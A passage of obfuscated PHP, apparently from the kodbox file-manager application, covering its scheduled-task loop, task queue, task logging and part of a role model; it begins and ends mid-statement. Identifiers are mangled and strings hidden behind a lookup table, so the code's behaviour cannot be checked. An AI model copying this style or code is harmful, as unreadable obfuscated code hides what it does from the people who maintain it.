$½ÔÊÃä­[91]) { $¿ÒŞ„ÖØ = self::valueGet($½ÔÊÃä­[1705]); if (time() - $¿ÒŞ„ÖØ > self::AUTO_RESTART_TIME) { self::restart(); } return; } self::clearUserStatus(); self::valueSet($½ÔÊÃä­[1704], $½ÔÊÃä­[91]); self::log($½ÔÊÃä­[1706] . ACTION . $½ÔÊÃä­[1707]); Hook::bind($½ÔÊÃä­[1708], $½ÔÊÃä­[1709]); $ëÈ€İÙ‚ = 0; while (!0) { self::cacheClear(); if (self::valueGet($½ÔÊÃä­[802]) != $½ÔÊÃä­[91]) { self::valueSet($½ÔÊÃä­[1704], $½ÔÊÃä­[219]); self::log($½ÔÊÃä­[1710]); die; } $¼–ğÚ“Ë = time(); if ($¼–ğÚ“Ë - $ëÈ€İÙ‚ >= 60) { self::valueSet(array($½ÔÊÃä­[1704] => $½ÔÊÃä­[91], $½ÔÊÃä­[1705] => $¼–ğÚ“Ë)); $ëÈ€İÙ‚ = $¼–ğÚ“Ë; } if (!file_exists(USER_SYSTEM . $½ÔÊÃä­[1711])) { self::valueSet(array($½ÔÊÃä­[1704] => $½ÔÊÃä­[219], $½ÔÊÃä­[802] => $½ÔÊÃä­[219])); self::log($½ÔÊÃä­[1712]); die; } $—ÙÈİÖœ = file_get_contents(BASIC_PATH . $½ÔÊÃä­[1713]); $×ôÕüéä = KOD_VERSION . $½ÔÊÃä­[10] . KOD_VERSION_BUILD; $¦í™å‹ = match_text($—ÙÈİÖœ, $½ÔÊÃä­[1714]) . $½ÔÊÃä­[10] . match_text($—ÙÈİÖœ, $½ÔÊÃä­[1715]); if ($¦í™å‹ != $×ôÕüéä) { self::restart(); self::log("\x73\x74\x6f\x70\x65\x64\56\x5b\166\145\x72\x73\x69\157\156\40\165\x70\144\x61\x74\x65\x3b{$versionNow}\x20\x3d\76\40{$version}\x5d"); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function clearUserStatus() { $Ù«©ÄÜ =& $_SERVER[º·Ï‹¥³]; http_close(); $GLOBALS[$Ù«©ÄÜ[1716]] = 1; $_SERVER[$Ù«©ÄÜ[1717]] = $Ù«©ÄÜ[1718]; $_COOKIE = array(); $GLOBALS[$Ù«©ÄÜ[1719]] = 1; $GLOBALS[$Ù«©ÄÜ[1720]] = 1; Session::$sessionSign = guid(); Session::$data = array(); } public static function restart() { $ÓÑæ¤õÆ =& $_SERVER[º·Ï‹¥³]; http_close(); self::valueSet($ÓÑæ¤õÆ[802], $ÓÑæ¤õÆ[219]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($ÓÑæ¤õÆ[1704] => $ÓÑæ¤õÆ[219], $ÓÑæ¤õÆ[802] => $ÓÑæ¤õÆ[91])); self::log($ÓÑæ¤õÆ[1721]); } public static function taskSwitch() { $£§Ã‹éÁ =& $_SERVER[º·Ï‹¥³]; $•ÕÈûñ• = self::valueGet($£§Ã‹éÁ[802]) == $£§Ã‹éÁ[91] ? $£§Ã‹éÁ[219] : $£§Ã‹éÁ[91]; self::valueSet($£§Ã‹éÁ[802], $•ÕÈûñ•); } public static function shutdownEvent() { $øÁÕÀ’ =& $_SERVER[º·Ï‹¥³]; self::valueSet($øÁÕÀ’[1704], $øÁÕÀ’[219]); self::log($øÁÕÀ’[1722]); } public static function config($Ô€ÏÎİÒ, $ĞÚÍ‰Ğ) { self::valueSet($_SERVER[º·Ï‹¥³][802], $Ô€ÏÎİÒ); } private static function taskRunAll() { $õë‰–³ =& $_SERVER[º·Ï‹¥³]; $ÔŠçîªø = timeFloat(); $Ù³†±ÒÊ = Model($õë‰–³[1723])->listData(); $ „µöì = count($Ù³†±ÒÊ); for ($ÉáéÃ’ó = 0; $ÉáéÃ’ó < $ „µöì; $ÉáéÃ’ó++) { $ñüÇ½®¦ = $Ù³†±ÒÊ[$ÉáéÃ’ó]; if (!$ñüÇ½®¦[$õë‰–³[459]] || $ñüÇ½®¦[$õë‰–³[1724]] != $õë‰–³[91]) { continue; } if (!self::taskTimeCheck($ñüÇ½®¦)) { continue; } self::taskRun($ñüÇ½®¦); } Hook::trigger($õë‰–³[1725]); self::taskQueueRun($ÔŠçîªø); } private static function taskQueueRun($éè¥Æ‹ø) { $í¾“‹ß§ = 10; while (!0) { $úØû‚Êñ = TaskQueue::run(); if ($úØû‚Êñ === !1) { break; } if (timeFloat() - $éè¥Æ‹ø >= $í¾“‹ß§) { break; } } } private static function taskTimeCheck($ªÀâĞÛÔ) { $’³¾Ìâì =& $_SERVER[º·Ï‹¥³]; $„Ôæ¡ÂÄ = json_decode($ªÀâĞÛÔ[$’³¾Ìâì[197]], !0); $¦ÒŒ‘ñ = intval($ªÀâĞÛÔ[$’³¾Ìâì[1705]]); $Á¡·¥’¢ = strtotime($’³¾Ìâì[1726] . $„Ôæ¡ÂÄ[$’³¾Ìâì[1727]] . $’³¾Ìâì[1728]) - strtotime($’³¾Ìâì[1729]); $ŒÎı«æ = time() - strtotime(date($’³¾Ìâì[1730]) . $’³¾Ìâì[1731]); $²Ô˜Ú×å = $ŒÎı«æ >= $Á¡·¥’¢ && $ŒÎı«æ <= $Á¡·¥’¢ + 3600; switch ($„Ôæ¡ÂÄ[$’³¾Ìâì[33]]) { case $’³¾Ìâì[1732]: if (time() - $¦ÒŒ‘ñ < 3600 * 24 * 30) { return !1; } if ($„Ôæ¡ÂÄ[$’³¾Ìâì[1732]] == date($’³¾Ìâì[1733]) && $²Ô˜Ú×å) { return !0; } break; case $’³¾Ìâì[1734]: if (time() - $¦ÒŒ‘ñ < 3600 * 24 * 7) { return !1; } $ğõËâÈë = date($’³¾Ìâì[1735]) == 0 ? 7 : date($’³¾Ìâì[1735]); if ($„Ôæ¡ÂÄ[$’³¾Ìâì[1734]] == $ğõËâÈë && $²Ô˜Ú×å) { return !0; } break; case $’³¾Ìâì[1727]: if (time() - $¦ÒŒ‘ñ < 3600 * 24) { return !1; } if ($²Ô˜Ú×å) { return !0; } break; case $’³¾Ìâì[1736]: if (time() - $¦ÒŒ‘ñ >= floatval($„Ôæ¡ÂÄ[$’³¾Ìâì[1736]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $œ¦Ê˜Ø“ =& $_SERVER[º·Ï‹¥³]; static $¨Ğˆ½€Â = 0; $ÂÚàæË´ = 300; if (!$¨Ğˆ½€Â) { $¨Ğˆ½€Â = time(); } if (time() - $¨Ğˆ½€Â < $ÂÚàæË´) { return; } $¨Ğˆ½€Â = time(); $µ¢ºÛ»Å = Model($œ¦Ê˜Ø“[562])->db($œ¦Ê˜Ø“[12]); if ($µ¢ºÛ»Å) { $µ¢ºÛ»Å->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($œ¦Ê˜Ø“[1737], $œ¦Ê˜Ø“[1738]); die; } } public static function taskRun($­ÒÆƒ‰Ì) { $…éŠâãú =& $_SERVER[º·Ï‹¥³]; self::log($…éŠâãú[1739] . $­ÒÆƒ‰Ì[$…éŠâãú[459]] . $…éŠâãú[1740] . $­ÒÆƒ‰Ì[$…éŠâãú[32]] . $…éŠâãú[1741] . $­ÒÆƒ‰Ì[$…éŠâãú[1742]]); Model($…éŠâãú[1723])->run($­ÒÆƒ‰Ì[$…éŠâãú[459]]); $Ş¡É¨ä = timeFloat(); $ §óÔ±± = $…éŠâãú[12]; switch ($­ÒÆƒ‰Ì[$…éŠâãú[33]]) { case $…éŠâãú[358]: $›î…›· = url_request($­ÒÆƒ‰Ì[$…éŠâãú[1742]], $…éŠâãú[252], !1, !1, !1, !1, 10); if ($›î…›·[$…éŠâãú[802]]) { $ §óÔ±± = strlen($›î…›·[$…éŠâãú[1255]]); } break; case $…éŠâãú[251]: $ §óÔ±± = Hook::apply($­ÒÆƒ‰Ì[$…éŠâãú[1742]]); default: break; } Model($…éŠâãú[1743])->add(array($…éŠâãú[1744] => $…éŠâãú[12], $…éŠâãú[1745] => $…éŠâãú[219], $…éŠâãú[33] => $…éŠâãú[1746] . $­ÒÆƒ‰Ì[$…éŠâãú[459]], $…éŠâãú[1747] => json_encode(array($…éŠâãú[32] => $­ÒÆƒ‰Ì[$…éŠâãú[32]], $…éŠâãú[1748] => timeFloat() - $Ş¡É¨ä, $…éŠâãú[344] => $ §óÔ±±)))); $òğô´âÕ = $ §óÔ±± ? $…éŠâãú[1749] . $ §óÔ±± : $…éŠâãú[12]; self::log($…éŠâãú[1750] . $­ÒÆƒ‰Ì[$…éŠâãú[459]] . $…éŠâãú[168] . $òğô´âÕ); return !0; } public static function valueGet($áïåÔºê) { $õ­æğ‘‹ =& $_SERVER[º·Ï‹¥³]; $Òåå­–¢ = $õ­æğ‘‹[1751]; $êÍ­‘êÑ = Model($õ­æğ‘‹[492])->get($áïåÔºê, $Òåå­–¢); if (is_null($êÍ­‘êÑ)) { Model($õ­æğ‘‹[492])->set($õ­æğ‘‹[802], $õ­æğ‘‹[91], $Òåå­–¢); Model($õ­æğ‘‹[492])->set($õ­æğ‘‹[1704], $õ­æğ‘‹[219], $Òåå­–¢); $êÍ­‘êÑ = Model($õ­æğ‘‹[492])->get($áïåÔºê, $Òåå­–¢); } return $êÍ­‘êÑ; } private static function valueSet($©³Šùú¢, $îîË€Ü¦ = false) { $×ÉüóŞò =& $_SERVER[º·Ï‹¥³]; $˜¿ÈÑ¥ = $×ÉüóŞò[1752]; CacheLock::lock($˜¿ÈÑ¥); $˜û˜‹«Å = Model($×ÉüóŞò[492])->set($©³Šùú¢, $îîË€Ü¦, $×ÉüóŞò[1751]); CacheLock::unlock($˜¿ÈÑ¥); return $˜û˜‹«Å; } protected static function log($ü†íÄ¢µ) { write_log($ü†íÄ¢µ, $_SERVER[º·Ï‹¥³][1738]); } private static function cacheClear() { $¯Ş®¹‰ù =& $_SERVER[º·Ï‹¥³]; Cache::clearMemory(Model($¯Ş®¹‰ù[492])->cacheKey($¯Ş®¹‰ù[1751])); Cache::clearMemory(Model($¯Ş®¹‰ù[492])->cacheKey($¯Ş®¹‰ù[1753])); Model($¯Ş®¹‰ù[1723])->cacheClear(); self::closeDatabase(); } } goto BÏµ‘ÓÁ“´; B‰â¼æ›õî: class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($Ùºª‚Æ, $¾é”ÏŠ = '', $½ˆÌíµ¶ = 0, $€ªˆáé¶ = '') { $ô›ì˜Ä› =& $_SERVER[º·Ï‹¥³]; $€ªˆáé¶ = $€ªˆáé¶ ? $€ªˆáé¶ : ($¾é”ÏŠ ? $¾é”ÏŠ : $Ùºª‚Æ); $Ñ”äŞĞØ = new Task($Ùºª‚Æ, $¾é”ÏŠ, $½ˆÌíµ¶, $€ªˆáé¶); $GLOBALS[$ô›ì˜Ä›[1837] . $Ùºª‚Æ] = new TaskLog($ô›ì˜Ä›[1738], $Ñ”äŞĞØ, $€ªˆáé¶); return $Ñ”äŞĞØ; } public function __construct($ê¶›õŞ = '', $¤Ë×™Œ€ = '', $º’”º·£ = '') { $ğüõå«¦ =& $_SERVER[º·Ï‹¥³]; if (!$ê¶›õŞ) { $ê¶›õŞ = $ğüõå«¦[1738]; } $ÌÀÓ‹´ = $ê¶›õŞ . $ğüõå«¦[446] . rand_string(10); if (!$º’”º·£) { $º’”º·£ = $ê¶›õŞ . $ğüõå«¦[53] . $º’”º·£; } switch ($ê¶›õŞ) { case $ğüõå«¦[1738]: if (!$¤Ë×™Œ€ || !$¤Ë×™Œ€->task) { return echoLog($ê¶›õŞ . $ğüõå«¦[1838]); } $õ­½ÊË· = $¤Ë×™Œ€; $ÌÀÓ‹´ = $õ­½ÊË·->task[$ğüõå«¦[459]]; $ê¶›õŞ = $õ­½ÊË·->task[$ğüõå«¦[459]]; if (!$õ­½ÊË·->task[$ğüõå«¦[1643]]) { $õ­½ÊË·->task[$ğüõå«¦[1643]] = $º’”º·£ ? $º’”º·£ : $ê¶›õŞ; } break; case $ğüõå«¦[1839]: if (!$¤Ë×™Œ€) { return echoLog($ê¶›õŞ . $ğüõå«¦[1840]); } $Àì¼Üì” = is_string($¤Ë×™Œ€) ? array($¤Ë×™Œ€) : $¤Ë×™Œ€; $õ­½ÊË· = new TaskFileTransfer($ÌÀÓ‹´, $ê¶›õŞ, 0, $º’”º·£ ? $º’”º·£ : $Àì¼Üì”[0]); foreach ($Àì¼Üì” as $À¡åÜÖ) { $õ­½ÊË·->addPath($À¡åÜÖ); } break; case $ğüõå«¦[364]: if (!$¤Ë×™Œ€) { return echoLog($ê¶›õŞ . $ğüõå«¦[1840]); } $Àì¼Üì” = is_string($¤Ë×™Œ€) ? array($¤Ë×™Œ€) : $¤Ë×™Œ€; $õ­½ÊË· = new TaskZip($ÌÀÓ‹´, $ê¶›õŞ, 0, $º’”º·£ ? $º’”º·£ : $Àì¼Üì”[0]); foreach ($Àì¼Üì” as $À¡åÜÖ) { $õ­½ÊË·->addPath($À¡åÜÖ); } break; case $ğüõå«¦[1267]: if (!$¤Ë×™Œ€) { return echoLog($ê¶›õŞ . $ğüõå«¦[1840]); } $õ­½ÊË· = new TaskUnZip($ÌÀÓ‹´, $ê¶›õŞ, 0, $º’”º·£ ? $º’”º·£ : $¤Ë×™Œ€); if ($¤Ë×™Œ€) { $õ­½ÊË·->addFile($¤Ë×™Œ€); } break; case $ğüõå«¦[152]: $õ­½ÊË· = new TaskHttp($ÌÀÓ‹´, $ê¶›õŞ); break; default: return; break; } $this->task = $õ­½ÊË·; $this->taskID = $ÌÀÓ‹´; Hook::bind($ğüõå«¦[1775], array($this, $ğüõå«¦[1841])); Hook::bind($ğüõå«¦[1777], array($this, $ğüõå«¦[1842])); Hook::bind($ğüõå«¦[1771], array($this, $ğüõå«¦[1843])); echoLog($ğüõå«¦[1844] . $õ­½ÊË·->task[$ğüõå«¦[1643]]); } public function __destruct() { $this->end(); } public function end($€Ö™ìÕÈ = '') { $ÊÍµÊ°í =& $_SERVER[º·Ï‹¥³]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($€Ö™ìÕÈ); $this->task = !1; $this->taskID = !1; Hook::unbind($ÊÍµÊ°í[1775], array($this, $ÊÍµÊ°í[1841])); Hook::unbind($ÊÍµÊ°í[1777], array($this, $ÊÍµÊ°í[1842])); Hook::unbind($ÊÍµÊ°í[1771], array($this, $ÊÍµÊ°í[1843])); } public function taskUpdate($¶ÈÉú©) { $Éïüáçƒ =& $_SERVER[º·Ï‹¥³]; if (!$¶ÈÉú© || $this->taskID != $¶ÈÉú©[$Éïüáçƒ[459]]) { return; } $ÄãÅÁ³ä = 20; $íéö¨Ÿ = intval($¶ÈÉú©[$Éïüáçƒ[1756]] * $ÄãÅÁ³ä); $¦ôõØ÷Ş = $Éïüáçƒ[166] . str_repeat($Éïüáçƒ[933], $íéö¨Ÿ) . $Éïüáçƒ[1063] . str_repeat($Éïüáçƒ[53], $ÄãÅÁ³ä - $íéö¨Ÿ) . $Éïüáçƒ[168]; $şš”ê = $¦ôõØ÷Ş . sprintf($Éïüáçƒ[1845], $¶ÈÉú©[$Éïüáçƒ[1756]] * 100) . $Éïüáçƒ[1846]; $Õ€·şÔô = $şš”ê . $¶ÈÉú©[$Éïüáçƒ[1755]] . $Éïüáçƒ[8] . $¶ÈÉú©[$Éïüáçƒ[1112]] . LNG($Éïüáçƒ[1847]); $úú†…ö· = $Éïüáçƒ[12]; if ($¶ÈÉú©[$Éïüáçƒ[1831]]) { $Õ€·şÔô = $şš”ê . size_format($¶ÈÉú©[$Éïüáçƒ[1755]]) . $Éïüáçƒ[8] . size_format($¶ÈÉú©[$Éïüáçƒ[1112]]); $úú†…ö· = size_format($¶ÈÉú©[$Éïüáçƒ[1757]]) . $Éïüáçƒ[1848]; } if ($¶ÈÉú©[$Éïüáçƒ[1114]]) { $¶ÈÉú©[$Éïüáçƒ[1805]] = $¶ÈÉú©[$Éïüáçƒ[1114]] . $Éïüáçƒ[53] . $¶ÈÉú©[$Éïüáçƒ[1805]]; } if ($¶ÈÉú©[$Éïüáçƒ[1805]]) { $§ôº€İå = $Éïüáçƒ[12]; if ($¶ÈÉú©[$Éïüáçƒ[1807]]) { $§ôº€İå = $Éïüáçƒ[50] . size_format($¶ÈÉú©[$Éïüáçƒ[1808]]) . $Éïüáçƒ[8] . size_format($¶ÈÉú©[$Éïüáçƒ[1807]]); } $úú†…ö· .= $¶ÈÉú©[$Éïüáçƒ[1805]] . $§ôº€İå; } if ($¶ÈÉú©[$Éïüáçƒ[815]] && !$¶ÈÉú©[$Éïüáçƒ[1807]]) { $úú†…ö· .= $Éïüáçƒ[53] . size_format($¶ÈÉú©[$Éïüáçƒ[1812]]) . $Éïüáçƒ[8] . size_format($¶ÈÉú©[$Éïüáçƒ[815]]); } echoLog($Õ€·şÔô . $Éïüáçƒ[53] . $úú†…ö·, !0); } public function taskEnd($Ü´ó÷Ç) { $åŞƒÇÙ† =& $_SERVER[º·Ï‹¥³]; if (!$Ü´ó÷Ç || $this->taskID != $Ü´ó÷Ç[$åŞƒÇÙ†[459]]) { return; } $ÂüÛ£ıØ = $Ü´ó÷Ç ? $Ü´ó÷Ç[$åŞƒÇÙ†[1755]] . $åŞƒÇÙ†[8] . $Ü´ó÷Ç[$åŞƒÇÙ†[1112]] . LNG($åŞƒÇÙ†[1847]) . $åŞƒÇÙ†[74] : $åŞƒÇÙ†[12]; echoLog($åŞƒÇÙ†[1849] . $Ü´ó÷Ç[$åŞƒÇÙ†[1643]] . ($Ü´ó÷Ç[$åŞƒÇÙ†[510]] ? $åŞƒÇÙ†[74] . $Ü´ó÷Ç[$åŞƒÇÙ†[510]] : $åŞƒÇÙ†[12]) . $åŞƒÇÙ†[74] . $ÂüÛ£ıØ . $åŞƒÇÙ†[1850] . sprintf($åŞƒÇÙ†[902], timeFloat() - $Ü´ó÷Ç[$åŞƒÇÙ†[1758]]) . $åŞƒÇÙ†[1770]); $this->end(); } public function taskKill($ò‡ıÚğ¶) { $ÀÈ½‰Á =& $_SERVER[º·Ï‹¥³]; if (!$ò‡ıÚğ¶ || $this->taskID != $ò‡ıÚğ¶[$ÀÈ½‰Á[459]]) { return; } echoLog($ÀÈ½‰Á[1851] . $ò‡ıÚğ¶[$ÀÈ½‰Á[1643]]); } } class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\164\141\163\153\x51\x75\145\x75\x65\114\x65\156\147\164\x68"; const QUEUE_DATA = "\x74\x61\x73\153\x51\x75\145\x75\145\104\x61\164\141"; const QUEUE_TIME = "\x74\x61\163\153\x51\165\145\165\x65\114\x61\x73\164\122\165\156"; const QUEUE_THREAD = "\164\141\163\x6b\121\165\145\165\x65\x54\150\x72\145\x61\144"; public static $listData = false; public static $listDataAdd = false; public static function initTask() { } public static function add($ë‡‰÷, $ÃşìÀà = array(), $ŠÃ¡ˆéï = '', $Ø­¬¹Ä¦ = '') { $£“óí‡î =& $_SERVER[º·Ï‹¥³]; if (self::$listData === !1) { self::$listData = self::getAll(); self::$listDataAdd = array(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($Ø­¬¹Ä¦ && array_find_by_field(self::$listData, $£“óí‡î[97], $Ø­¬¹Ä¦)) { return !0; } if ($Ø­¬¹Ä¦ && array_find_by_field(self::$listDataAdd, $£“óí‡î[97], $Ø­¬¹Ä¦)) { return !0; } self::$listDataAdd[] = array($£“óí‡î[316] => $ë‡‰÷, $£“óí‡î[1852] => $ÃşìÀà, $£“óí‡î[510] => $ŠÃ¡ˆéï, $£“óí‡î[97] => $Ø­¬¹Ä¦); return !0; } public static function addSubmit() { $Éğ»´Â  =& $_SERVER[º·Ï‹¥³]; if (!self::$listDataAdd || count(self::$listDataAdd) == 0) { return; } self::setAll(array_merge(self::getAll(), self::$listDataAdd)); write_log($Éğ»´Â [1853] . json_encode_force(array_to_keyvalue(self::$listDataAdd, $Éğ»´Â [12], $Éğ»´Â [510])), $Éğ»´Â [188]); self::$listData = !1; self::$listDataAdd = !1; } public static function addNow($şÉËıæ, $¾È¨î› = array(), $ŸÎ÷çÃ» = '', $’ã›‚Ó = '') { $Ô§±í´¡ =& $_SERVER[º·Ï‹¥³]; if (self::count() >= self::MAX_LENGTH) { return !1; } $ËŸ‰¹’ = self::getAll(); if ($’ã›‚Ó && array_find_by_field($ËŸ‰¹’, $Ô§±í´¡[97], $’ã›‚Ó)) { return !0; } $ËŸ‰¹’[] = array($Ô§±í´¡[316] => $şÉËıæ, $Ô§±í´¡[1852] => $¾È¨î›, $Ô§±í´¡[510] => $ŸÎ÷çÃ», $Ô§±í´¡[97] => $’ã›‚Ó); self::setAll($ËŸ‰¹’); write_log($Ô§±í´¡[1853] . $ŸÎ÷çÃ», $Ô§±í´¡[188]); return !0; } public static function run() { $Æ›ò¾Û½ =& $_SERVER[º·Ï‹¥³]; $³Ö©‡£· = self::getAll(); $‚öˆ‘îŒ = array_shift($³Ö©‡£·); if (!$‚öˆ‘îŒ) { return !1; } self::setAll($³Ö©‡£·); $ãğô¯’ = timeFloat(); $ÇÇÓ Œ§ = $Æ›ò¾Û½[12]; try { $ÇÇÓ Œ§ = Hook::apply($‚öˆ‘îŒ[$Æ›ò¾Û½[316]], $‚öˆ‘îŒ[$Æ›ò¾Û½[1852]]); } catch (Exception $Ô¬›‰ºû) { write_log($Ô¬›‰ºû, $Æ›ò¾Û½[1235]); } $‡şôÜí = number_format(timeFloat() - $ãğô¯’, 3) . $Æ›ò¾Û½[1770]; if ($ÇÇÓ Œ§ && is_string($ÇÇÓ Œ§)) { $‡şôÜí = $‡şôÜí . $Æ›ò¾Û½[1854] . $ÇÇÓ Œ§; } write_log($Æ›ò¾Û½[1855] . $‚öˆ‘îŒ[$Æ›ò¾Û½[510]] . $Æ›ò¾Û½[1856] . $‡şôÜí, $Æ›ò¾Û½[188]); Cache::set(self::QUEUE_TIME, time(), 3600 * 24 * 30); return !0; } public static function runThread() { $™¹­ğä¢ =& $_SERVER[º·Ï‹¥³]; $ïÛŒÆîĞ = self::threadCount() + 1; if ($ïÛŒÆîĞ > 3 || !self::count()) { return; } write_log($™¹­ğä¢[1857] . $ïÛŒÆîĞ, $™¹­ğä¢[188]); Cache::set(self::QUEUE_THREAD, $ïÛŒÆîĞ, 3600 * 24); AutoTask::clearUserStatus(); while (!0) { if (!self::run()) { break; } usleep(mt_rand(200, 50000)); } Cache::set(self::QUEUE_THREAD, 0, 3600 * 24); write_log($™¹­ğä¢[1858], $™¹­ğä¢[188]); } public static function getKey($æÜõ‹ó, $„ä€³¢ô = "\x69\x6e\164") { $äïè¨úù =& $_SERVER[º·Ï‹¥³]; Cache::removeMemory($æÜõ‹ó); $à°Èßï¬ = Cache::get($æÜõ‹ó); if ($„ä€³¢ô == $äïè¨úù[339]) { return $à°Èßï¬ ? intval($à°Èßï¬) : 0; } if ($„ä€³¢ô == $äïè¨úù[1859]) { return is_array($à°Èßï¬) ? $à°Èßï¬ : array(); } return $à°Èßï¬; } public static function lastTime() { return self::getKey(self::QUEUE_TIME); } public static function count() { return self::getKey(self::QUEUE_LENGTH); } public static function threadCount() { return self::getKey(self::QUEUE_THREAD); } public static function getAll() { return self::getKey(self::QUEUE_DATA, $_SERVER[º·Ï‹¥³][1859]); } public static function setAll($”ª“ùû) { $˜äØ¿² = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($”ª“ùû), $˜äØ¿²); Cache::set(self::QUEUE_DATA, $”ª“ùû, $˜äØ¿²); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); Cache::set(self::QUEUE_THREAD, 0, 60); } } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($˜ãÓëƒˆ, $€®³ò®á = 5.0) { if (!$˜ãÓëƒˆ) { return; } $—ß­¾â¨ = Cache::get($˜ãÓëƒˆ); if (!$—ß­¾â¨ || timeFloat() - floatVal($—ß­¾â¨) >= $€®³ò®á) { Cache::set($˜ãÓëƒˆ, timeFloat(), $€®³ò®á * 10); return !0; } return !1; } public static function timeLimitCall($©šçœüÄ, $¢ª†ƒ¡, $Ï‚®¿„¸, $§ØœÃı« = 5.0) { $»×¾¢ûù =& $_SERVER[º·Ï‹¥³]; if (!$©šçœüÄ || !$¢ª†ƒ¡) { return; } self::$asyncAdd = !0; $â‰³Ó® = $»×¾¢ûù[1860]; $³ñŸ§‚ƒ = Cache::get($â‰³Ó®, !0); $¹­í¦˜— = array($»×¾¢ûù[1861] => timeFloat(), $»×¾¢ûù[1862] => timeFloat(), $»×¾¢ûù[316] => $¢ª†ƒ¡, $»×¾¢ûù[1852] => $Ï‚®¿„¸, $»×¾¢ûù[197] => $§ØœÃı«); if (is_array($³ñŸ§‚ƒ[$©šçœüÄ])) { $¹­í¦˜—[$»×¾¢ûù[1862]] = $³ñŸ§‚ƒ[$©šçœüÄ][$»×¾¢ûù[1862]]; } if (is_array($³ñŸ§‚ƒ[$©šçœüÄ])) { if (timeFloat() - $³ñŸ§‚ƒ[$©šçœüÄ][$»×¾¢ûù[1861]] < $¹­í¦˜—[$»×¾¢ûù[197]] * 0.3) { return; } $¹­í¦˜—[$»×¾¢ûù[1862]] = $³ñŸ§‚ƒ[$©šçœüÄ][$»×¾¢ûù[1862]]; } $³ñŸ§‚ƒ[$©šçœüÄ] = $¹­í¦˜—; Cache::set($â‰³Ó®, $³ñŸ§‚ƒ, 60); Cache::removeMemory($â‰³Ó®); write_log($»×¾¢ûù[1863] . $©šçœüÄ . $»×¾¢ûù[74] . $¢ª†ƒ¡, $»×¾¢ûù[188]); } public static function timeLimitCallLoop() { $¶„–·ÖÙ =& $_SERVER[º·Ï‹¥³]; $õ¥ƒöü = array($¶„–·ÖÙ[1864]); $ªóÚï·ø = in_array(strtolower(ACTION), $õ¥ƒöü); if (!$ªóÚï·ø && !self::$asyncAdd) { return; } $º´ÛŠ• = $¶„–·ÖÙ[1860]; $³×å ¥¿ = Cache::get($º´ÛŠ•, !0); if (!$³×å ¥¿ || count($³×å ¥¿) <= 0) { return; } $ß™´äú = !1; $ªœô’ß› = timeFloat(); $Ô§åŒ¨Ï = array(); foreach ($³×å ¥¿ as $º–ºş‚Á => $ŒæñÒßá) { if ($ªœô’ß› - $ŒæñÒßá[$¶„–·ÖÙ[1862]] > $ŒæñÒßá[$¶„–·ÖÙ[197]]) { $ß™´äú = !0; try { Hook::apply($ŒæñÒßá[$¶„–·ÖÙ[316]], $ŒæñÒßá[$¶„–·ÖÙ[1852]]); write_log($¶„–·ÖÙ[1865] . $º–ºş‚Á . $¶„–·ÖÙ[74] . $ŒæñÒßá[$¶„–·ÖÙ[316]] . $¶„–·ÖÙ[1866] . ACTION, $¶„–·ÖÙ[188]); } catch (Exception $¾ûÅ…ã”) { } continue; } $Ô§åŒ¨Ï[$º–ºş‚Á] = $ŒæñÒßá; } if (!$ß™´äú) { return; } if (!$Ô§åŒ¨Ï) { return Cache::remove($º´ÛŠ•); } Cache::set($º´ÛŠ•, $Ô§åŒ¨Ï, 60); Cache::removeMemory($º´ÛŠ•); } public static function finished($œÙÜˆ¡ , $áîÎ¯ó) { $üÓØ×Éı =& $_SERVER[º·Ï‹¥³]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($üÓØ×Éı[316] => $œÙÜˆ¡ , $üÓØ×Éı[1852] => $áîÎ¯ó); } private static function finishedRun() { $òà…îÚÂ =& $_SERVER[º·Ï‹¥³]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $Ï„¬«Ì) { try { Hook::apply($Ï„¬«Ì[$òà…îÚÂ[316]], $Ï„¬«Ì[$òà…îÚÂ[1852]]); } catch (Exception $¢ıâıûà) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } goto FÒÆÜèÁ…¦; Eæ¡óÃòÕÅ: class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\171\163\164\145\x6d\56\x72\x6f\154\x65\x4c\151\x73\x74"; public $field = array("\156\141\x6d\x65", "\141\165\x74\x68", "\x6c\141\142\x65\154", "\x64\151\163\160\x6c\x61\171", "\163\171\x73\x74\x65\155", "\144\145\x73\x63", "\x69\147\x6e\x6f\x72\x65\x45\x78\164", "\151\x67\x6e\x6f\162\145\x46\x69\154\x65\x53\151\172\x65", "\141\144\x6d\151\156\x69\163\x74\x72\141\x74\157\162", "\x73\157\162\x74"); public function listData($™©²ÛØ­ = false, $ï´Å­½ = "\x73\157\x72\x74", $é•œÅ•º = false) { $ê…À€µ… =& $_SERVER[º·Ï‹¥³]; $æÒ›”¯é = parent::listData($™©²ÛØ­, $ï´Å­½, $é•œÅ•º); if (!$™©²ÛØ­) { foreach ($æÒ›”¯é as $—Éñ‘‡Î => $ó„öÒğ) { if ($ó„öÒğ[$ê…À€µ…[2160]] == 1) { $æÒ›”¯é[$—Éñ‘‡Î][$ê…À€µ…[510]] = LNG($ê…À€µ…[2423]); } } } return $æÒ›”¯é; } public function update($ï§ûÔ¥§, $Ğä²İò) { $ÍÔßÜŞè =& $_SERVER[º·Ï‹¥³]; $íÌïŒÁÑ = parent::listData($ï§ûÔ¥§); $Çì“«ıë = $this->findByName($Ğä²İò[$ÍÔßÜŞè[32]]); if (!$íÌïŒÁÑ || $Çì“«ıë && $Çì“«ıë[$ÍÔßÜŞè[459]] != $íÌïŒÁÑ[$ÍÔßÜŞè[459]]) { return !1; } if ($Çì“«ıë[$ÍÔßÜŞè[2160]] == 1) { $Ğä²İò = array($ÍÔßÜŞè[32] => $Ğä²İò[$ÍÔßÜŞè[32]], $ÍÔßÜŞè[1975] => $Ğä²İò[$ÍÔßÜŞè[1975]]); } $this->filterAuth($Ğä²İò[$ÍÔßÜŞè[471]]); return parent::update($ï§ûÔ¥§, 